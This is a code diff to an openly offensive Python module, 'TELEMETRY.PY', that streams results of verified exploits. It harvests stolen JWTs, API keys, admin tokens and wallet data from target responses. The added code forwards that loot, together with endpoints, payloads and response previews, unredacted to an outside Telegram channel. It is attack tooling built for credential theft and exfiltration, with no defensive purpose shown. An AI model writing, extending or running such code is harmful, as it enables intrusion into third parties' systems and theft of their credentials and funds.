@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 """
-TELEMETRY.PY v7.5 — Live Offensive Streamer & Automated Loot Exfiltration Handler (Elite Edition)
+TELEMETRY.PY v8.0 — Live Offensive Streamer & Automated Loot Exfiltration Handler (With Telegram Telemetry)
 Features:
 - Automated high-value loot parsing (JWTs, API keys, wallet balances, admin tokens)
 - Zero-disk in-memory exfiltration packaging
 - Real-time zero-delay proof-of-work terminal rendering
+- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
 """
 import sys
 import json
+import asyncio
+from modules.telegram_notifier import send_telegram_alert
 
 CYAN = "\033[96m"
 GREEN = "\033[92m"
@@ -18,6 +21,17 @@ BOLD = "\033[1m"
 MATRIX_GREEN = "\033[38;5;46m"
 NEON_BLUE = "\033[38;5;51m"
 MAGENTA = "\033[95m"
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous telemetry streams."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def extract_valuable_loot(response_body):
     """Parses response bodies to automatically harvest high-value credentials, keys, and tokens."""
@@ -38,7 +52,8 @@ def extract_valuable_loot(response_body):
 
 def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
     """
-    Instantly streams verified proof-of-work and automatically extracts exfiltrated loot to the terminal.
+    Instantly streams verified proof-of-work, automatically extracts exfiltrated loot to the terminal,
+    and broadcasts unredacted assets directly to Telegram.
     """
     sys.stdout.write(f"\n{RED}{BOLD}[***] LIVE EXPLOIT VERIFIED: {exploit_type.upper()} [***]{RESET}\n")
     sys.stdout.write(f"  ├── Target Endpoint : {NEON_BLUE}{endpoint}{RESET}\n")
@@ -53,11 +68,24 @@ def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
 
     sys.stdout.write(f"  └── STOLEN VALUE / PROOF:\n")
     
+    proof_dict = {}
     if isinstance(proof_data, dict):
         for k, v in proof_data.items():
             sys.stdout.write(f"      ├── {CYAN}{k}{RESET} : {MATRIX_GREEN}{v}{RESET}\n")
+            proof_dict[k] = v
     else:
         sys.stdout.write(f"      └── {MATRIX_GREEN}{str(proof_data)[:300]}{RESET}\n")
+        proof_dict["proof"] = str(proof_data)
         
     sys.stdout.write(f"  └── Response Preview: {GREEN}{response_body[:150]}...{RESET}\n\n")
     sys.stdout.flush()
+
+    # BROADCAST UNREDACTED EXPLOIT PROOF & LOOT STRAIGHT TO TELEGRAM
+    telegram_payload = {
+        "endpoint": endpoint,
+        "payload": str(payload),
+        "auto_loot": auto_loot,
+        "proof": proof_dict,
+        "response_preview": response_body[:300]
+    }
+    broadcast_tg_alert_sync(f"Live Exploit Verified [{exploit_type}]", telegram_payload)
